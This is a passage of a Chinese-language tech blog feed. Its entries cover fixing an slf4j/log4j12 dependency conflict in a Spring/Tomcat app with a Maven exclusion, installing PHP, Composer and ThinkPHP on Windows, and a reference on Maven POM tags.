class="hljs-selector-class">.servlet</span><span class="hljs-selector-class">.ServletException</span>: Failed to instantiate WebApplicationInitializer class        at org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.SpringServletContainerInitializer</span><span class="hljs-selector-class">.onStartup</span>(SpringServletContainerInitializer<span class="hljs-selector-class">.java</span>:<span class="hljs-number">158</span>)        at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.StandardContext</span><span class="hljs-selector-class">.startInternal</span>(StandardContext<span class="hljs-selector-class">.java</span>:<span class="hljs-number">5183</span>)        at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.LifecycleBase</span><span class="hljs-selector-class">.start</span>(LifecycleBase<span class="hljs-selector-class">.java</span>:<span class="hljs-number">152</span>)        at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.ContainerBase</span><span class="hljs-selector-class">.addChildInternal</span>(ContainerBase<span class="hljs-selector-class">.java</span>:<span class="hljs-number">726</span>)        at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.ContainerBase</span><span class="hljs-selector-class">.addChild</span>(ContainerBase<span class="hljs-selector-class">.java</span>:<span class="hljs-number">702</span>)        at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.StandardHost</span><span class="hljs-selector-class">.addChild</span>(StandardHost<span class="hljs-selector-class">.java</span>:<span class="hljs-number">734</span>)        at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.startup</span><span class="hljs-selector-class">.HostConfig</span><span class="hljs-selector-class">.deployWAR</span>(HostConfig<span class="hljs-selector-class">.java</span>:<span class="hljs-number">952</span>)        at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.startup</span>.HostConfig<span class="hljs-variable">$DeployWar</span><span class="hljs-selector-class">.run</span>(HostConfig<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1823</span>)        at java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.concurrent</span>.Executors<span class="hljs-variable">$RunnableAdapter</span><span class="hljs-selector-class">.call</span>(Executors<span class="hljs-selector-class">.java</span>:<span class="hljs-number">511</span>)        at java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.concurrent</span><span class="hljs-selector-class">.FutureTask</span><span class="hljs-selector-class">.run</span>(FutureTask<span class="hljs-selector-class">.java</span>:<span class="hljs-number">266</span>)        at java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.concurrent</span><span class="hljs-selector-class">.ThreadPoolExecutor</span><span class="hljs-selector-class">.runWorker</span>(ThreadPoolExecutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1142</span>)        at java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.concurrent</span>.ThreadPoolExecutor<span class="hljs-variable">$Worker</span><span class="hljs-selector-class">.run</span>(ThreadPoolExecutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">617</span>)        at java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Thread</span><span class="hljs-selector-class">.run</span>(Thread<span class="hljs-selector-class">.java</span>:<span class="hljs-number">745</span>)Caused by: java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.InvocationTargetException</span>        at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeConstructorAccessorImpl</span><span class="hljs-selector-class">.newInstance0</span>(Native Method)        at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeConstructorAccessorImpl</span><span class="hljs-selector-class">.newInstance</span>(NativeConstructorAccessorImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">62</span>)        at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingConstructorAccessorImpl</span><span class="hljs-selector-class">.newInstance</span>(DelegatingConstructorAccessorImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">45</span>)        at java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Constructor</span><span class="hljs-selector-class">.newInstance</span>(Constructor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">422</span>)        at org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.SpringServletContainerInitializer</span><span class="hljs-selector-class">.onStartup</span>(SpringServletContainerInitializer<span class="hljs-selector-class">.java</span>:<span class="hljs-number">155</span>)        ... <span class="hljs-number">12</span> moreCaused by: java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ExceptionInInitializerError</span>        at org<span class="hljs-selector-class">.slf4j</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.StaticLoggerBinder</span>.&lt;init&gt;(StaticLoggerBinder<span class="hljs-selector-class">.java</span>:<span class="hljs-number">72</span>)        at org<span class="hljs-selector-class">.slf4j</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.StaticLoggerBinder</span>.&lt;clinit&gt;(StaticLoggerBinder<span class="hljs-selector-class">.java</span>:<span class="hljs-number">45</span>)        at org<span class="hljs-selector-class">.slf4j</span><span class="hljs-selector-class">.LoggerFactory</span><span class="hljs-selector-class">.bind</span>(LoggerFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">128</span>)        at org<span class="hljs-selector-class">.slf4j</span><span class="hljs-selector-class">.LoggerFactory</span><span class="hljs-selector-class">.performInitialization</span>(LoggerFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">108</span>)        at org<span class="hljs-selector-class">.slf4j</span><span class="hljs-selector-class">.LoggerFactory</span><span class="hljs-selector-class">.getILoggerFactory</span>(LoggerFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">279</span>)        at org<span class="hljs-selector-class">.slf4j</span><span class="hljs-selector-class">.LoggerFactory</span><span class="hljs-selector-class">.getLogger</span>(LoggerFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">252</span>)        at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.SLF4JLogFactory</span><span class="hljs-selector-class">.getInstance</span>(SLF4JLogFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">155</span>)        at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.SLF4JLogFactory</span><span class="hljs-selector-class">.getInstance</span>(SLF4JLogFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">132</span>)        at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.LogFactory</span><span class="hljs-selector-class">.getLog</span>(LogFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">685</span>)        at org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.AbstractContextLoaderInitializer</span>.&lt;init&gt;(AbstractContextLoaderInitializer<span class="hljs-selector-class">.java</span>:<span class="hljs-number">45</span>)        at org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.servlet</span><span class="hljs-selector-class">.support</span><span class="hljs-selector-class">.AbstractDispatcherServletInitializer</span>.&lt;init&gt;(AbstractDispatcherServletInitializer<span class="hljs-selector-class">.java</span>:<span class="hljs-number">52</span>)        at org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.servlet</span><span class="hljs-selector-class">.support</span><span class="hljs-selector-class">.AbstractAnnotationConfigDispatcherServletInitializer</span>.&lt;init&gt;(AbstractAnnotationConfigDispatcherServletInitializer<span class="hljs-selector-class">.java</span>:<span class="hljs-number">44</span>)        at com<span class="hljs-selector-class">.pacemrc</span><span class="hljs-selector-class">.jowtopoc</span><span class="hljs-selector-class">.Initializer</span><span class="hljs-selector-class">.AppInitializer</span>.&lt;init&gt;(AppInitializer<span class="hljs-selector-class">.java</span>:<span class="hljs-number">7</span>)        ... <span class="hljs-number">17</span> moreCaused by: java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.IllegalStateException</span>: Detected both log4j-over-slf4j<span class="hljs-selector-class">.jar</span> AND bound slf4j-log4j12<span class="hljs-selector-class">.jar</span> on the class <span class="hljs-selector-tag">path</span>, preempting StackOverflowError. See also &lt;http:<span class="hljs-comment">//www.slf4j.org/codes.html#log4jDelegationLoop&gt; for more details.</span>        at org<span class="hljs-selector-class">.slf4j</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.Log4jLoggerFactory</span>.&lt;clinit&gt;(Log4jLoggerFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">54</span>)        ... <span class="hljs-number">30</span> more</code></pre></div><p>根据最后的Caused by提示，检测到<code>log4j-over-slf4j.jar</code>和<code>slf4j-log4j12.jar</code>同时存在，推测可能是依赖冲突导致的</p><p><strong>解决方法</strong></p><p>使用maven helper查看冲突项，根据相关jar包关键字先查看<code>slf4j-api</code>，查看详细依赖，发现<code>mybatis-spring-boot-starter</code>间接引入了<code>log4j-over-slf4j</code>,<code>hadoop-common</code>间接引入了<code>slf4j-log4j12</code>，两者确实同时存在</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230918194902062.png"></p><p>最后在 <code>mybatis-spring-boot-starter</code>依赖下排除依赖<code>log4j-over-slf4j</code></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-over-slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><p>重新打包后成功运行</p><p><strong>参考</strong></p><p><a href="https://blog.csdn.net/zhanxiaozhangA/article/details/103428027">https://blog.csdn.net/zhanxiaozhangA/article/details/103428027</a></p><p><a href="https://blog.51cto.com/u_16175477/6917470">https://blog.51cto.com/u_16175477/6917470</a></p><p><a href="https://mp.weixin.qq.com/s/0G5kLzz8Mtwf2hchB8ba7A">https://mp.weixin.qq.com/s/0G5kLzz8Mtwf2hchB8ba7A</a></p><p><a href="https://www.bilibili.com/video/BV1Ts4y1A7gs">https://www.bilibili.com/video/BV1Ts4y1A7gs</a></p>]]></content>
    
    
    <categories>
      
      <category>问题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Maven</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows安装PHP项目</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/PHP/Windows%E5%AE%89%E8%A3%85PHP%E9%A1%B9%E7%9B%AE/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/PHP/Windows%E5%AE%89%E8%A3%85PHP%E9%A1%B9%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a><strong>下载地址</strong></h2><p><strong>php</strong>：<a href="https://windows.php.net/download">https://windows.php.net/download</a></p><p><strong>Microsoft Visual C++运行库:</strong></p><p><a href="https://learn.microsoft.com/zh-CN/cpp/windows/latest-supported-vc-redist?view=msvc-170">https://learn.microsoft.com/zh-CN/cpp/windows/latest-supported-vc-redist?view=msvc-170</a></p><p><strong>composer</strong>： <a href="https://getcomposer.org/download/">https://getcomposer.org/download/</a></p><p><strong>php包</strong>： <a href="https://packagist.org/">https://packagist.org/</a></p><p>本文档示例安装php7.4.33</p><h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><h3 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h3><p>访问<a href="https://windows.php.net/download">https://windows.php.net/download</a></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-1.png"></p><p>php–7.4需要VC15运行库，需提前安装</p><p>php分为线程安全、非线程安全包，此处选择VC15 x64 Non Thread Safe，下载zip文件</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-2.png"></p><p>将下载的php-7.4.33-nts-Win32-vc15-x64.zip文件解压至特定目录</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-3.png"></p><h3 id="配置系统环境变量"><a href="#配置系统环境变量" class="headerlink" title="配置系统环境变量"></a>配置系统环境变量</h3><p>*<strong>\PHP_HOME：xxxx*</strong></p><p>*<strong>\Path：%PHP_HOME%*</strong></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-4.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-5.png"></p><h3 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h3><p>*<strong>\php -v*</strong></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-6.png"></p><h2 id="安装composer"><a href="#安装composer" class="headerlink" title="安装composer"></a>安装composer</h2><p>访问<a href="https://getcomposer.org/download/%E4%B8%8B%E8%BD%BDComposer-Setup.exe">https://getcomposer.org/download/下载Composer-Setup.exe</a></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-7.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-8.png"></p><p>手动指定php目录下的php.exe</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-9.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-10.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-11.png"></p><p>点击Install进行安装，安装完成后需运行一下composer。打开cmd执行composer命令即可</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-12.png"></p><p>下载composer.phar</p><p><a href="https://getcomposer.org/download/%E4%B8%8B%E6%8B%89%E5%87%BA%E7%8E%B0composer.phar">https://getcomposer.org/download/下拉出现composer.phar</a> 下载链接，选择较新的一个即可</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-13.png"></p><p>将下载的composer.phar移动至php安装目录，同时创建一个composer.cmd文件，写入以下内容</p><p>@php “%~dp0composer.phar” %*</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-14.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-15.png"></p><p>验证安装</p><p>composer –version</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-16.png"></p><p>设置阿里云镜像</p><p>composer config -g repo.packagist composer <a href="https://mirrors.aliyun.com/composer/">https://mirrors.aliyun.com/composer/</a></p><p>查看composer配置</p><p>composer config -l -g</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-17.png"></p><p>开启常用扩展</p><p>编辑php安装目录php.ini文件</p><p>将extension前面的“;”号去掉保存即可</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-18.png"></p><h2 id="安装php项目"><a href="#安装php项目" class="headerlink" title="安装php项目"></a>安装php项目</h2><p>以安装thinkphp为例</p><p>创建一个空的文件夹</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-19.png"></p><p>访问<a href="https://packagist.org/%EF%BC%8C%E6%90%9C%E7%B4%A2thinkphp">https://packagist.org/，搜索thinkphp</a></p><p>进入topthink&#x2F;think</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-20.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-21.png"></p><p>命令：</p><p>安装最新版本：composer create-project topthink&#x2F;think</p><p>安装指定版本：composer create-project topthink&#x2F;think tp 5.1.41</p><p>进入到空文件夹，打开cmd，执行命令即可安装</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/p1-22.png"></p>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>POM文件</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Maven/POM%E6%96%87%E4%BB%B6/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Maven/POM%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="高级特性"><a href="#高级特性" class="headerlink" title="高级特性"></a>高级特性</h1><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>        ...    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre></div><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>当子项目找不到某个信息时，从父项目中查找信息。</p><p>父模块中可以被继承的信息</p><div class="code-wrapper"><pre><code class="hljs mipsasm">groupId：项目组ID，项目坐标的核心元素version：项目版本，项目坐标的核心元素description：项目的描述信息<span class="hljs-keyword">organization：项目的组织信息</span><span class="hljs-keyword"></span>inceptionYear：项目的创始年份url：项目的url地址developers：项目的开发者信息contributors：项目的贡献者信息<span class="hljs-keyword">distributionManagement：项目的部署配置信息</span><span class="hljs-keyword"></span>issueManagement：项目的缺陷跟踪系统信息ciManagement：项目的持续集成系统信息<span class="hljs-keyword">scm：项目的版本控制系统信息</span><span class="hljs-keyword"></span>mailingLists：项目的邮件列表信息properties：自定义的maven属性配置信息dependencyManagement：项目的依赖管理配置repositories：项目的仓库配置<span class="hljs-keyword">build：包括项目的源码目录配置、输出目录配置、插件管理配置等信息</span><span class="hljs-keyword"></span>reporting：包括项目的报告输出目录配置、报告插件配置等信息</code></pre></div><h3 id="依赖版本管理"><a href="#依赖版本管理" class="headerlink" title="依赖版本管理"></a>依赖版本管理</h3><p>父项目使用  <code>&lt;packing&gt;</code>pom<code>&lt;/packing&gt;</code>        <code>&lt;dependencyManagement&gt;</code>…<code>&lt;/dependencyManagement&gt;</code></p><p>子项目使用 省略依赖的版本<code>&lt;version&gt;</code>…<code>&lt;/version&gt;</code></p><h2 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h2><p><strong>多模块生命周期管理</strong></p><p>父项目使用<code>&lt;packing&gt;</code>pom<code>&lt;/packing&gt;</code>   <code>&lt;module&gt;</code>…<code>&lt;/module&gt;</code></p><p>子项目使用<code>&lt;parent&gt;</code>…<code>&lt;/parent&gt;</code></p><h2 id="聚合与继承的关系"><a href="#聚合与继承的关系" class="headerlink" title="聚合与继承的关系"></a>聚合与继承的关系</h2><p>聚合主要是为了方便多模块快速构建，而继承主要是为了重用相同的配置。对于聚合来说，聚合模块是知道被聚合模块的存在的，而被聚合模块是感知不到聚合模块的存在。对于继承来说，父构件是感知不到子构件的存在，而子构件需要使用 parent 来引用父构件。</p><p>两者的共同点是，聚合模块和继承中的父模块的package属性都必须是pom类型的，同时，聚合模块和父模块中的除了pom.xml，一般都是没有什么内容的。</p><h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><p><code>&lt;project&gt;</code> ：POM文件的根标签。</p><p><code>&lt;modelVersion&gt;</code>：声明项目描述符遵循哪一个POM模型版本。模型本身的版本很少改变，虽然如此，但它仍然是必不可少的，这是为了当Maven引入了新的特性或者其他模型变更的时候，确保稳定性。<strong>Maven2及Maven 3的版本是4.0.0</strong>。</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;&lt;http://maven.apache.org/POM/4.0.0&gt;&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;&lt;http://maven.apache.org/POM/4.0.0&gt; &lt;http://maven.apache.org/xsd/maven-4.0.0.xsd&gt;&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>    ...    ...<span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span></code></pre></div><h2 id="基础设置"><a href="#基础设置" class="headerlink" title="基础设置"></a>基础设置</h2><p><code>&lt;groupId&gt;</code>：项目组ID。</p><p><code>&lt;artifactId&gt;</code>：构件的标识符，它和groupId一起唯一标识一个构件</p><p><code>&lt;version&gt;</code>：项目的版本，格式为:主版本.次版本.增量版本-限定版本号</p><p><code>&lt;packaging&gt;</code>：项目产生的构件类型，默认有jar、war、ear、pom类型</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>testJNDI<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>jar<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span></code></pre></div><p><code>&lt;properties&gt;</code>：配置自定义的maven属性信息。可通过<code>$&#123;&#125;</code>引用值。</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-section">&lt;properties&gt;</span><span class="hljs-section">&lt;maven.compiler.source&gt;</span><span class="hljs-attribute">8</span>&lt;/maven.compiler.source&gt;<span class="hljs-section">&lt;maven.compiler.target&gt;</span><span class="hljs-attribute">8</span>&lt;/maven.compiler.target&gt;<span class="hljs-section">&lt;dubbo.version&gt;</span><span class="hljs-attribute">2</span>.<span class="hljs-number">7</span>.<span class="hljs-number">6</span>&lt;/dubbo.version&gt;<span class="hljs-section">&lt;spring.version&gt;</span><span class="hljs-attribute">3</span>.<span class="hljs-number">5</span>.<span class="hljs-number">14</span>&lt;/spring.version&gt;    <span class="hljs-section">&lt;project.build.sourceEncoding&gt;</span><span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>&lt;/project.build.sourceEncoding&gt;    <span class="hljs-section">&lt;project.reporting.outputEncoding&gt;</span><span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>&lt;/project.reporting.outputEncoding&gt;<span class="hljs-section">&lt;/properties&gt;</span></code></pre></div><p><code>&lt;parent&gt;</code>：指定当前项目引用的父项目的坐标。</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>        <span class="hljs-comment">&lt;!--被继承的父项目的构件标识符 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span> /&gt;</span>        <span class="hljs-comment">&lt;!--被继承的父项目的全球唯一标识符 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span> /&gt;</span>        <span class="hljs-comment">&lt;!--被继承的父项目的版本 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span> /&gt;</span>        <span class="hljs-comment">&lt;!-- 父项目的pom.xml文件的相对路径。--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span></code></pre></div><h3 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.pacemrc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  //组件的地址<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jowtopoc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span> //组件的名称<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  //组件的版本<span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>jar<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span>  //打包的类型，有jar,war,pom等<span class="hljs-tag">&lt;<span class="hljs-name">classifier</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">classifier</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>system<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>  //组件的使用范围，有compile,runtime,test,system等,默认为compile<span class="hljs-tag">&lt;<span class="hljs-name">systemPath</span>&gt;</span>/path/to/jar<span class="hljs-tag">&lt;/<span class="hljs-name">systemPath</span>&gt;</span>   //当组件的使用范围为system时需要指定组件的本地路径<span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span>  //用于解决依赖冲突问题，排除依赖<span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span>   //可选项<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre></div><h3 id="dependencyManagement"><a href="#dependencyManagement" class="headerlink" title="dependencyManagement"></a>dependencyManagement</h3><p>依赖管理。</p><h3 id="modules"><a href="#modules" class="headerlink" title="modules"></a>modules</h3><p>指定当前项目拥有的子模块。</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">modules</span>&gt;</span>test1<span class="hljs-tag">&lt;/<span class="hljs-name">modules</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">modeles</span>&gt;</span>test2<span class="hljs-tag">&lt;/<span class="hljs-name">modeles</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">modeles</span>&gt;</span>test3<span class="hljs-tag">&lt;/<span class="hljs-name">modeles</span>&gt;</span></code></pre></div><h2 id="构建设置"><a href="#构建设置" class="headerlink" title="构建设置"></a>构建设置</h2><h3 id="build标签"><a href="#build标签" class="headerlink" title="build标签"></a>build标签</h3><h3 id="finalName"><a href="#finalName" class="headerlink" title="finalName"></a>finalName</h3><div class="code-wrapper"><pre><code class="hljs xml">指定项目最终打包的名称，默认为$&#123;artifactId&#125;-$&#123;version&#125;</code></pre></div><h3 id="plugins"><a href="#plugins" class="headerlink" title="plugins"></a>plugins</h3><ul><li><strong>plugin</strong></li></ul><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>                //具体插件<span class="hljs-tag">&lt;<span 